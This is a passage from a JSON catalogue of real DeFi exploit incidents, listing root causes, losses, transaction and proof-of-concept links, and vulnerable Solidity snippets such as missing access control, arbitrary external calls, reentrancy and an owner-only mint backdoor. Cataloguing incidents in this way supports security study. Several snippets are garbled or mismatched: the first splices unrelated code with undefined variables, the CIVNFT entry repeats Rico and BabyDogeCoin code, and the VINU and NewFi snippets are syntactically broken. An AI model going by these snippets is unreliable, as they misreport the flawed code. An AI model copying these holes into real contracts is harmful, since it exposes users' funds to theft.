        "vulnerable_code_snippet": "function mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable nonReentrant {\n        require(!mintPaused, \"Pool::mint: Minting is paused\");\n        uint256 _ftmIn = msg.value;\n        address _minter = msg.sender;\n\n        (uint256 _xftmOut, , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(\n            _ftmIn\n        );\n        require(_xftmOut >= _minXftmOut, \"Pool::mint: > slippage\");\n\n        WethUtils.wrap(_ftmIn);\nif (_yTokenOutTwap > 0 && _wethSwapIn > 0) {\n            WethUtils.weth.safeIncreaseAllowance(address(swapStrategy), _wethSwapIn);\nswapStrategy.execute(_wethSwapIn, _yTokenOutTwap);\n        }\n\n        if (_xTokenOut > 0) {\n            userInfo[_sender].xTokenBalance = userInfo[_sender].xTokenBalance + _xTokenOut;\nunclaimedXToken = unclaimedXToken + _xTokenOut;\n        }\n\n        transferToTreasury(_fee);\n\n        emit Mint(_sender, _xTokenOut, _ftmIn, _fee);\n    }\n\n/// @notice Calculate the expected results for zap minting\n    /// @param _ethIn Amount of Collateral token input.\n    /// @return _xTokenOut : the amount of XToken output.\n    /// @return _yTokenOutTwap : the amount of YToken output by swapping based on TWAP\n    /// @return _ethFee : the fee amount in Collateral token.\n    /// @return _ethSwapIn : the amount of Collateral token to swap\nfunction calcMint(uint256 _ethIn)\n        public\n        view\n        returns (\n            uint256 _xTokenOut,\n            uint256 _yTokenOutTwap,\n            uint256 _ethFee,\n            uint256 _ethSwapIn\n        ) {\n        uint256 _yTokenTwap = oracle.getYTokenTWAP();\n        require(_yTokenTwap > 0, \"Pool::calcMint: Invalid YToken price\");\n        _ethSwapIn = (_ethIn * (COLLATERAL_RATIO_MAX - collateralRatio)) / COLLATERAL_RATIO_MAX;\n        _yTokenOutTwap = (_ethSwapIn * PRICE_PRECISION) / _yTokenTwap;\n        _ethFee = (_ethIn * mintingFee * collateralRatio) / COLLATERAL_RATIO_MAX / PRECISION;\n        _xTokenOut = _ethIn - ((_ethIn * mintingFee) / PRECISION);\n    }"
    },
    {
        "type": "ERC20, Flashloans",
        "date": "20220606",
        "lost": "$49 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220606-discover---flashloan--price-oracle-manipulation",
        "title": "Discover",
        "root_cause": "Incorrect price calculation via balanceOf.",
        "vulnerable_code": "https://bscscan.com/address/0xe732a7bd6706cbd6834b300d7c56a8d2096723a7#code#L242",
        "analysis": null,
        "vulnerable_code_snippet":"function getprice() public view returns (uint256 _price) {\n    uint256 lpusdtamount=usdt.balanceOf(_lpaddr); //vulnerable point \n    uint256 lpotheramount=other.balanceOf(_lpaddr); //vulnerable point\n   \n    _price=lpusdtamount*10**18/lpotheramount;\n}"
 
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20230826",
        "title": "SVT",
        "root_cause": "The exploit starts out by loaning BUSD from dodo private pool, half of which is then used to buy SVT repeatedly, the second time a much smaller amount than the first. its all then sold leaving the attacker with more than SVT than was originally bought ",
        "attack_tx": "https://twitter.com/Phalcon_xyz/status/1695285435671392504?s=20",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/SVT_exp.sol",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1695285435671392504?s=20"
    },
    {
        "type": "Lack of permission control",
        "date": "20230514",
        "title": "landNFT",
        "root_cause": "Lack of permission control on mint.",
        "attack_tx": "https://bscscan.com/tx/0xe4db1550e3aa78a05e93bfd8fbe21b6eba5cce50dc06688949ab479ebed18048",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/landNFT_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1658002030953365505",
        "Lost": "$149,616 $BUSD",
        "vulnerable_code_snippet": "function mint(address player,uint256 amount) external whenNotPaused() onlyMiner{\n            uint256 _tokenId = totalSupply();\n            require(_tokenId.add(amount)<=MAX_SUPPLY,\"MAX_SUPPLY err\");\n            _safeMint(player, amount);\n        }"
    },
    {
        "type": "Incorrect logic",
        "date": "20230905",
        "title": "HeavensGate",
        "root_cause": "The problem originated from the `stake()` function in the HeavensGate contract. This function sends funds to the caller before triggering a rebase. As a result, instead of distributing an amount of sHATE equal to the newly minted HATE in the next rebase, it includes the user's stake. This causes a mismatch between the contract's HATE balance and the circulating sHATE. The attacker exploited this by repeatedly calling the `stake()` and `unstake()` functions within the same transaction.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/HeavensGate_exp.sol",
        "attack_tx": [
            "https://etherscan.io/tx/0xe28ca1f43036f4768776805fb50906f8172f75eba3bf1d9866bcd64361fda834",
            "https://etherscan.io/tx/0x8e1b0ab098c4cc5f632e00b0842b5f825bbd15ded796d4a59880bb724f6c5372"
        ],
        "analysis": "https://twitter.com/hexagate_/status/1699003711937216905",
        "vulnerable_code_snippet": "function stake(address _to, uint256 _amount) external {\n        HATE.transferFrom(msg.sender, address(this), _amount);\n        rebase();\n        sHATE.transfer(_to, _amount);\n    }\n...\nfunction rebase() public {\n        if (epoch.end <= block.timestamp) {\n            sHATE.rebase(epoch.distribute, epoch.number);\n\n            epoch.end = epoch.end + epoch.length;\n            epoch.number++;\n\n            if (address(distributor) != address(0)) {\n                distributor.distribute();\n            }\n\n            uint256 balance = HATE.balanceOf(address(this));\n            uint256 staked = sHATE.circulatingSupply();\n\n            if (balance <= staked) {\n                epoch.distribute = 0;\n            } else {\n                epoch.distribute = balance - staked;\n            }\n        }\n    }\n...\nfunction unstake(address _to, uint256 _amount, bool _rebase) external {\n        if (_rebase) rebase();\n        sHATE.transferFrom(msg.sender, address(this), _amount);\n        require(_amount <= HATE.balanceOf(address(this)), \"Insufficient HATE balance in contract\");\n        HATE.transfer(_to, _amount);\n    }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20221210",
        "lost": "$57k",
        "title": "MU&MUG",
        "root_cause": "FlashLoan price manipulation.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/avax/0xab39a17cdc200c812ecbb05aead6e6f574712170eafbd73736b053b168555680",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol",
        "vulnerable_code": "https://snowtrace.io/address/0x4aa679402c6afce1e0f7eb99ca4f09a30ce228ab#code#F9#L167",
        "analysis": [
            "https://docs.mu.money/more-mu-info/mu-hack",
            "https://www.certik.com/resources/blog/3pdPXDWLvf0wKZ9yy3HeHz-mu-coin-incident-analysis"
        ],
        "vulnerable_code_snippet": "function mu_bond(address stable, uint256 amount) public nonReentrant { //vulnerable point\n        require(is_approved_stable_coin(stable) ,\"Only accepting approved stable coins for bonding\");\n        IERC20 _stable = IERC20(stable);\n        Token token = Token(stable);\n        uint8 _decimals = token.decimals();\n        uint256 _adjusted_amount;\n        if(18 - _decimals == 0)\n            _adjusted_amount = amount;\n        else {\n            _adjusted_amount = (amount/(10**(18-_decimals)));\n        }\n        require(_stable.balanceOf(msg.sender) >= _adjusted_amount, \"You don't have enough of that token to bond that amount\");\n        (uint256 mu_coin_swap_amount, uint256 mu_coin_amount) = _mu_bond_quote(amount);\n        require(IERC20(_MuCoin).balanceOf(address(this)) >= mu_coin_amount, \"This contract does not have enough Mu Coin\");\n        _stable.transferFrom(msg.sender, address(this), _adjusted_amount);\n        IERC20(_MuCoin).transfer(msg.sender, mu_coin_amount);\n        MuMoneyMinter(_MuMoney).mint(address(this), amount);\n    }\n\nfunction mu_gold_bond(address stable, uint256 amount) public nonReentrant{ //vulnerable point\n        require(is_approved_stable_coin(stable) ,\"Only accepting approved stable coins for bonding\");\n        \n        IERC20 _stable = IERC20(stable);\n        Token token = Token(stable);\n        uint8 _decimals = token.decimals();\n        uint256 _adjusted_amount;\n        if(18 - _decimals == 0)\n            _adjusted_amount = amount;\n        else {\n            _adjusted_amount = (amount/(10**(18-_decimals)));\n        }\n        require(_stable.balanceOf(msg.sender) >= _adjusted_amount, \"You don't have enough of that token to bond that amount\");\n            (uint256 mu_gold_swap_amount, uint256 mu_gold_bond_amount)  = _get_mug_bond_quote(amount);\n            require(IERC20(_MuGold).balanceOf(address(this)) >= mu_gold_bond_amount, \"This contract does not have enough Mu Coin\");\n            _stable.transferFrom(msg.sender, address(this), _adjusted_amount);\n            IERC20(_MuGold).transfer(msg.sender, mu_gold_bond_amount);\n            MuMoneyMinter(_MuMoney).mint(address(this), amount);\n\n    }"
    },
    {
        "type": "Incorrect logic",
        "date": "20230502",
        "title": "Level",
        "root_cause": "Due to the lack of checks of repeated items for the array argument of the vulnerable function.",
        "attack_tx": [
            "https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04",
            "https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Level_exp.sol",
        "analysis": [
            "https://twitter.com/peckshield/status/1653149493133729794",
            "https://twitter.com/BlockSecTeam/status/1653267431127920641",
            "https://twitter.com/kalos_security/status/1668092143167213569"
        ],
        "Lost": "$1M",
        "vulnerable_code_snippet": "function claimMultiple(uint256[] calldata _epoches, address _to) external {\n\tuint256 totalReward;\n\tfor (uint256 i; i < _epoches.length; ++i) {\n\t\tuint256 epoch = _epoches[i];\n\t\tif (epoch < currentEpoch) {\n\t\t\tuint256 reward = claimable(epoch, msg.sender);\n\t\t\tusers[epoch][msg.sender].claimed = reward;  // @audit: vulnerable, should be +=\n\t\t\ttotalReward += reward;\n\t\t}\n\t}\n\tLVL.safeTransfer(_to, totalReward);\n}"
    },
    {
        "type": "Arbitrary call, Insufficient validation",
        "date": "20230207",
        "title": "CowSwap",
        "root_cause": "Arbitrary External Call Vulnerability. The settle function allows arbitrary calls, and the solver contract doesn't validate the interaction data. This vulnerability allows attackers to have the GPv2 contract approve their malicious contract, ultimately leading to a drain of the settlement contract.",
        "attack_tx": [
            "https://etherscan.io/tx/0x92f906bce94bab417cccc87ae046448d7fb8c2c0350b7ed911545577acb3bfc1",
            "https://etherscan.io/tx/0x90b468608fbcc7faef46502b198471311baca3baab49242a4a85b73d4924379b"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/CowSwap_exp.sol",
        "analysis": [
            "https://twitter.com/MevRefund/status/1622793836291407873",
            "https://twitter.com/peckshield/status/1622801412727148544"
        ],
        "lost": "$120k",
        "vulnerable_code_snippet": "function settle(\n        IERC20[] calldata tokens, // The function accepts an arbitrary token address from CallData and does not check the token received.\n        uint256[] calldata clearingPrices,\n        GPv2Trade.Data[] calldata trades,\n        GPv2Interaction.Data[][3] calldata interactions\n    ) external nonReentrant onlySolver {\n        executeInteractions(interactions[0]);\n\n        (\n            GPv2Transfer.Data[] memory inTransfers,\n            GPv2Transfer.Data[] memory outTransfers\n        ) = computeTradeExecutions(tokens, clearingPrices, trades);  //vulnerable point\n\n        vaultRelayer.transferFromAccounts(inTransfers); //vulnerable point\n\n        executeInteractions(interactions[1]);\n\n        vault.transferToAccounts(outTransfers);\n\n        executeInteractions(interactions[2]);\n\n        emit Settlement(msg.sender);\n    }"
    },
    {
        "type": "Access Control, Insufficient validation",
        "date": "20240424",
        "lost": ">200k USD",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/XBridge_exp.sol",
        "title": "XBridge",
        "root_cause": "Lack of regulated access control. When a user makes an external call to the listToken function of this exploited contract, if the base token matches the corresponding token, then without any prior verification of the token owner or the caller of the contract, anyone would be able to set the token owner to themselves",
        "vulnerable_code": "[https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c#code](https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c#code)",
        "attack_tx": [
            "https://etherscan.io/tx/0xe09d350d8574ac1728ab5797e3aa46841f6c97239940db010943f23ad4acf7ae",
            "https://etherscan.io/tx/0x903d88a92cbc0165a7f662305ac1bff97430dbcccaa0fe71e101e18aa9109c92"
        ],
        "analysis": "When a user makes an external call to the listToken function of this exploited contract, if the base token matches the corresponding token, then without any prior verification of the token owner or the caller of the contract, anyone would be able to set the token owner to themselves.",
        "additional_info": "https://medium.com/neptune-mutual/understanding-the-xbridge-exploit-d3d56c0dc19c",
        "vulnerable_code_snippet": "function listToken(tokenInfo memory baseToken, tokenInfo memory correspondingToken, bool _isMintable) external payable { <-- vulnerable point\n        address _baseToken = baseToken.token;\n        address _correspondingToken = correspondingToken.token;\n        require(_baseToken != address(0), \"INVALID_ADDR\");\n        require(_correspondingToken != address(0), \"INVALID_ADDR\");\n        require(tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_baseToken] == address(0) && tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] == address(0), \"THIS_PAIR_ALREADY_LISTED\");"
    },
    {
        "type": "Arbitrary call",
        "date": "20240420",
        "title": "Rico",
        "root_cause": "Arbitrary Call over flash()",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Rico_exp.sol",
        "vulnerable_code_snippet": "function flash(address code, bytes calldata data)\n  external payable returns (bytes memory result) {\n    // lock->mint->call->burn->unlock\n    VatStorage storage vs = getVatStorage();\n    if (vs.flock == LOCKED) revert ErrLock();\n    vs.flock = LOCKED;\n\n    getBankStorage().rico.mint(code, _MINT);\n    bool ok;\n    (ok, result) = code.call(data); <-- vulnerable point\n    if (!ok) bubble(result);\n    getBankStorage().rico.burn(code, _MINT);\n\n    vs.flock = UNLOCKED;\n  }",
        "attack_tx": [
            "https://arbiscan.io/tx/0x5d2a94785d95a740ec5f778e79ff014c880bcefec70d1a7c2440e611f84713d6",
            "https://app.blocksec.com/explorer/tx/arbitrum/0x5d2a94785d95a740ec5f778e79ff014c880bcefec70d1a7c2440e611f84713d6"
        ],
        "analysis": "https://x.com/ricocreditsys/status/1781803698940781009"
    },
    {
        "type": "Slippage",
        "date": "20230717",
        "title": "NewFi",
        "root_cause": "The root cause is the lack of slippage check. Specifically, the pool's slippage check for token swaps relied solely on a spot price, which allowed the attacker to manipulate the price, make the pool to execute a one-directional token swap, and then profit by sandwiching the swap.",
        "attack_tx": "https://bscscan.com/tx/0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/NewFi_exp.sol",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1680961588323557376",
        "vulnerable_code_snippet": "if(!pass) {\n    (quoteAmount, _amountOut(id,pools[id].token0,pools[id].token1,amount0,false);\n}\n\n// Exchange token 1 token 0: Spend a fixed number of tokens\nSwap(id,pools[id].token0,pools[id].token1,amount0,quoteAmount,0); ... function _amountOut(\n    uint id,\n    address tokenIn,\n    address tokenOut,\n    uint amountIn,\n    bool all\n) \n    private returns (uint outAmount,uint inAmount) {\n    if(all) {\n        amountIn = balanceOf(tokenIn);\n    }\n    bytes memory path = abi.encodePacked(tokenIn,pools[id].fee,tokenOut);\n    (outAmount,,) = IQouterV2(quotev2).quoteExactInput(path,amountIn);\n    inAmount = amountIn;\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20230606",
        "title": "VINU",
        "root_cause": "The exploiter passes an existing Uniswap pool as devaddr allowing him to manipulate the price.",
        "attack_tx": "https://etherscan.io/tx/0xaf46a42fe1ed7193b25c523723dc047c7500e50a00ecb7bbb822d665adb3e1f3",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/VINU_exp.sol",
        "analysis": "https://x.com/hexagate_/status/1666051854386511873?cxt=HHwWgoC24bPVgJ8uAAAA",
        "Lost": "$6k",
        "vulnerable_code_snippet": "function addLiquidityETH(address routeraddr,address lpaddr,address devaddr) external payable {\n    uint256 senderBalance = balances[devaddr] * 80 / 100;\n    balances[devaddr] -= senderBalance;\n    _balances[address(this)] = senderBalance;\n    emit Transfer(devaddr, address(this), senderBalance);\n    IUniswapV2Router2 router = IUniswapV2Router2(router.factory());\n    address uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());\n    _approve(address(this), _totalSupply);\n    address(this).balanceOf(address(this)),0,0,lpaddr,block.timestamp);\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20230731",
        "title": "GYMNET",
        "root_cause": "The root Cause is the wrong implement of `swapExactTokensForTokensSupportingFeeOnTransferTokens()`. The `from` should be `msg.sender`",
        "attack_tx": "https://bscscan.com/tx/0x7fe96c00880b329aa0fcb00f0ef3a0766c54e13965becf9cc5e0df6fbd0deca6",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/GYMNET_exp.sol",
        "analysis": "https://twitter.com/AnciliaInc/status/1686605510655811584",
        "vulnerable_code_snippet": "function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to) external {\n    uint256 tokenAcommission = (amountIn * commission) / 1e18;\n    uint256 outAmount = IPancakeRouter02(routerAddress).getAmountsOut(1e18, path)[1];\n    require(amountOutMin >= (amountIn * outAmount * 90) / 100, \"GymRouter: Must be greater than 90% of out amount\");\n    IERC20Upgradeable(path[0]).safeTransferFrom(to, address(this), amountIn); // It should be msg.sender\n    IERC20Upgradeable(path[0]).safeIncreaseAllowance(routerAddress, amountIn - tokenAcommission);\n    IPancakeRouter02(routerAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        amountIn - tokenAcommission,\n        amountOutMin,\n        path,\n        to,\n        block.timestamp + 300\n    );\n}"
    },
    {
        "type": "Access Control, Flashloans",
        "date": "20230307",
        "lost": "$100k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Phoenix_exp.sol",
        "title": "Phoenix",
        "root_cause": "PhxProxy contract delegateCallSwap() function lack of access control and can be passed in any parameter\n// The lost money is mainly USDC in the d028 contract which the attacker converts into WETH in the 65ba contract through the buyLeverage() function\nand then swaps it into his own tokens by the delegateCallSwap() function, making a profit from it",
        "attack_tx": "https://polygonscan.com/tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4",
        "analysis": "https://twitter.com/HypernativeLabs/status/1633090456157401088",
        "vulnerable_code_snippet": "function delegateCallSwap(bytes memory data) public returns (bytes memory) { //vulnerable point Access control\n        (bool success, bytes memory returnData) = phxSwapLib.delegatecall(data);\n        assembly {\n            if eq(success, 0) {\n                revert(add(returnData, 0x20), returndatasize)\n            }\n        }\n        return returnData;\n    }"
    },
    {
        "type": "Reentrancy",
        "date": "20240228",
        "title": "SMOOFSStaking",
        "root_cause": "Because the `_removeStake()` call is too late, the attacker can call withdraw multiple times.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/SMOOFSStaking_exp.sol",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/polygon/0xde51af983193b1be3844934b2937a76c19610ddefcdd3ffcf127db3e68749a50",
        "analysis": "https://twitter.com/AnciliaInc/status/1762893563103428783",
        "vulnerable_code_snippet": "function Withdraw(uint256 _tokenId, bool forceWithTax) external whenNotPaused {\n    require(stakes[_tokenId].owner == msg.sender, \"Not owner\");\n    if (block.timestamp < stakingEndTime) {\n        if (block.timestamp < stakes[_tokenId].unboundingAt) {\n            require(forceWithTax == true, \"Requires Forced Unstaking\");\n        }\n    }\n    if (stakes[_tokenId].state == NFTState.Staked) {\n        Unstake(_tokenId, forceWithTax);\n    } else if (stakes[_tokenId].state == NFTState.Unbounding) {\n        rewardToken.transferFrom(\n            msg.sender,\n            address(this),\n            earlyUnboundTax\n        );\n        stakes[_tokenId].state = NFTState.Free;\n    }\n    //transfer nft to owner\n    nftCollection.safeTransferFrom(address(this), msg.sender, _tokenId);\n    //transfer tokens to owner\n    rewardToken.transfer(msg.sender, nftStakeCarryAmount);\n}"
    },
    {
        "type": "Flashloans, Yield",
        "date": "20220321",
        "title": "OneRing Finance",
        "root_cause": "Incorrect price calculation via reverse.",
        "lost": "$1.45 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation",
        "vulnerable_code": [
            "https://ftmscan.com/address/0x66a13cd7ea0ba9eb4c16d9951f410008f7be3a10#code#F1#L216",
            "https://ftmscan.com/address/0xdbc07e219ba0cb5fddcd0fa0c5cc1eddfb77e082#code#F2#L378"
        ],
        "analysis": "Incorrect price calculation via reverse.",
        "vulnerable_code_snippet": "function getUSDBalanceFromUnderlyingBalance(uint256 _bal) public view returns (uint256 _amount) {\n    if (_bal > 0) {\n        address _token0 = IUniswapV2Pair(underlying).token0();\n        address _token1 = IUniswapV2Pair(underlying).token1();\n\n        (uint256 _reserves0, uint256 _reserves1, ) = IUniswapV2Pair(\n            underlying\n        ).getReserves(); \n        uint256 _totalSupply = IERC20(underlying).totalSupply();\n        //vulnerable point\n        uint256 _amount0 = _reserves0.mul(_bal).div(_totalSupply); //vulnerable point\n        uint256 _amount1 = _reserves1.mul(_bal).div(_totalSupply); //vulnerable point\n\n        uint256 _vaultDecimals = ERC20(vault).decimals();\n        uint256 _vaultUnit = uint256(10)**uint256(_vaultDecimals);\n        uint256 _token0Unit = uint256(10) **\n            uint256(ERC20(_token0).decimals());\n        uint256 _token1Unit = uint256(10) **\n            uint256(ERC20(_token1).decimals());\n\n        _amount =\n            _amount0.mul(_vaultUnit).div(_token0Unit) +\n            _amount1.mul(_vaultUnit).div(_token1Unit);\n    }\n}"
    },
    {
        "type": "Access Control, Insufficient validation",
        "date": "20231112",
        "title": "MEVBot_0xa247",
        "root_cause": "The attack on unverified contracts is created by 0x3904ef. The flaw was in function 0xe7d25975, which lacked access control and allowed the attacker to set `_removeAdmin` and withdraw tokens. For example, in contract 0xa24734, the attacker used this flaw to withdraw RAIL tokens and convert them to ETH.",
        "attack_tx": [
            {
                "hash": "0x53eeab4447db331dbb47f93fd58a95d6faa230d559acde0687f8b5f5829e7a45",
                "explorer_link": "https://app.blocksec.com/explorer/tx/eth/0x53eeab4447db331dbb47f93fd58a95d6faa230d559acde0687f8b5f5829e7a45"
            },
            {
                "hash": "0x573199feba92ab6577",
                "explorer_link": "https://t.co/6KcL5OMqoJ"
            },
            {
                "hash": "0xb56e984a866afed36c",
                "explorer_link": "https://t.co/2nnjKSbIOJ"
            },
            {
                "hash": "0xdfbfb0387129541c65",
                "explorer_link": "https://t.co/85ueRdaNSZ"
            }
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/MEV_0xa247_exp.sol",
        "analysis": "https://x.com/Phalcon_xyz/status/1723591214262632562",
        "vulnerable_code_snippet":"if (address(vArg)) { \n    require(address(vArg).code.size);\n    require(v[7] == address(this).gas(msg.gas));\n    require(RETURN_DATASIZE == 32);\n    ...\n} else {\n    v0 = this.balance;\n    v1 = _removeAdmin.call(value(vg) .gas(2300 + v9));\n    require(v0); \n}"
    },
    {
        "type": "Slippage",
        "date": "20230529",
        "title": "BabyDogeCoin",
        "root_cause": "FarmZAP contract enjoys 0 tax of babydoge buy/sell, attacker manipulated pancake pair price.",
        "lost": "$135k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BabyDogeCoin_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1662744426475831298",
        "vulnerable_code_snippet": "function buyTokensAndDepositOnBehalf(\n    IFarm farm,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] calldata path\n) external payable returns(uint256) {\n    if (msg.value > 0) {\n        require(address(WBNB) == path[0], \"Input token != WBNB\");\n        require(amountIn == msg.value, \"Invalid msg.value\");\n        WBNB.deposit{value: amountIn}();\n    } else {\n        IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\n    }\n    address tokenOut = path[path.length - 1];\n    require(tokenOut == farm.stakeToken(), \"Not a stake token\");\n\n    _approveIfRequired(path[0], address(router), amountIn);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        amountIn,\n        amountOutMin,\n        path,\n        address(this),\n        block.timestamp + 1200\n    );\n    uint256 received = IERC20(tokenOut).balanceOf(address(this));\n\n    _approveIfRequired(tokenOut, address(farm), received);\n    farm.depositOnBehalf(received, msg.sender);\n\n    emit TokensBoughtAndDeposited (\n        address(farm),\n        msg.sender,\n        path[0],\n        tokenOut,\n        amountIn,\n        received\n    );\n\n    return received;\n}"
    },
    {
        "type": "Precision",
        "date": "20231019",
        "title": "kTAF",
        "root_cause": "kTAF is a Compound fork project and was exploited due to the empty market issue in Compound v2. This rounding issue leads to the inflation of the exchange rate. Similar problems can be found in the following projects:\n[GitHub - YAcademy-Residents/defi-fork-bugs: Bugs in commonly forked DeFi protocols](https://github.com/YAcademy-Residents/defi-fork-bugs?tab=readme-ov-file)",
        "attack_tx": "0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/kTAF_exp.sol",
        "analysis": "https://defimon.xyz/attack/mainnet/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4"
    },
    {
        "type": "Price Manipulation",
        "date": "20240205",
        "title": "BurnsDefi",
        "root_cause": "The root cause of the exploit was a flaw that allowed the attacker to burn tokens twice to the same holder, resulting in the receipt of disproportionate rewards. This enabled the attacker to manipulate the reward distribution mechanism and collect an excessive amount of rewards.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/bsc/0x1d0af3a963682748493f21bf9e955ce3a950bee5817401bf2486db7a0af104b4",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BurnsDefi_exp.sol",
        "analysis": "https://twitter.com/pennysplayer/status/1754342573815238946",
        "Lost": "67K"
    },
    {
        "type": "Business Logic Flaw, Reentrancy",
        "date": "20231007",
        "title": "StarsArena",
        "root_cause": "Reentrancy, Business Logic Flaw",
        "attack_tx": "https://snowtrace.io/tx/0x4f37ffecdad598f53b8d5a2d9df98e3c00fbda4328585eb9947a412b5fe17ac5",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/StarsArena_exp.sol",
        "analysis": [
            "https://x.com/peckshield/status/1710555944269292009",
            "https://twitter.com/BlockSecTeam/status/1710556926986342911",
            "https://twitter.com/Phalcon_xyz/status/1710554341466395065",
            "https://twitter.com/peckshield/status/1710555944269292009"
        ],
        "vulnerable_code": "https://snowtrace.io/address/0xa481b139a1a654ca19d2074f174f17d7534e8cec",
        "vulnerable_code_snippet": "if (v14) {\n    0x30ef(v14, msg.sender);\n}\nif (v3 / 0xde0b6b3a7640000) {\n   0x2f7b(v3 / 0xde0b6b3a7640000, msg.sender);\n}\nif (varg0 == _getMyShares[address(varg1)][msg.sender]) {\n    v15 = address(varg1);\n    owner_a7[v15].field0.length = owner_a7[v15].field0.length + 1;\n    owner_a7[v15].field0[owner_a7[v15].field0.length].field0 = msg.sender | bytes12(owner_a7[v15].field0[owner_a7[v15].field0.length].field0);\n}"
    },
    {
        "type": "Rug-Pull(Protocol Side)",
        "date": "20221209",
        "lost": "330 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/NovaExchange_exp.sol",
        "title": "NOVAToken",
        "root_cause": "Malicious Unlimted Minting (Rugged)",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xf743dba906255cf6f75f8243ef8192f2a211aacf03df99322584686b5c445c23",
        "analysis": "https://twitter.com/BeosinAlert/status/1601168659585454081",
        "vulnerable_code_snippet": "function rewardHolders(uint256 amount) external onlyOwner { //backdoor\n        _balances[owner()] += amount;\n        _totalSupply += amount;\n    }"
    },
    {
        "type": "Access Control",
        "date": "20230708",
        "title": "CIVNFT",
        "root_cause": "Because of a lack of Access control over specific functions `0x7ca06d68` , Attacker can manipulate the `_uniswapV3MintCallback` value and execute the attack contract directly.",
        "attack_tx": [
            "https://etherscan.io/tx/0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb",
            "https://app.blocksec.com/explorer/tx/eth/0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/CIVNFT_exp.sol",
        "analysis": "https://blog.solidityscan.com/civnft-hack-analysis-4ee79b8c33d1",
        "lost": "$180k",
        "vulnerable_code_snippet":"function flash(address code, bytes calldata data)\\n    external payable returns (bytes memory result) {\\n    // lock->mint->call->burn->unlock\\n    VatStorage storage vs = getVatStorage();\\n    if (vs.flock == LOCKED) revert ErrLock();\\n    vs.flock = LOCKED;\\n\\n    getBankStorage().rico.mint(code, _MINT);\\n    bool ok;\\n    (ok, result) = code.call(data); // vulnerable point\\n    if (!ok) bubble(result);\\n    getBankStorage().rico.burn(code, _MINT);\\n\\n    vs.flock = UNLOCKED;\\n} ... if (msg.value > 0) {\\n    require(address(WBNB) == path[0], \"Input token != WBNB\");\\n    require(amountIn == msg.value, \"Invalid msg.value\");\\n    WBNB.deposit{value: amountIn}();\\n} else {\\n    IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\\n}"
    },
    {
        "type": "Oracle, Price Manipulation",
        "date": "20240223",
        "title": "CompoundUni",
        "root_cause": "The root cause is Compound prices have not been updated in time, so the attacker found the chance to arbitrage",
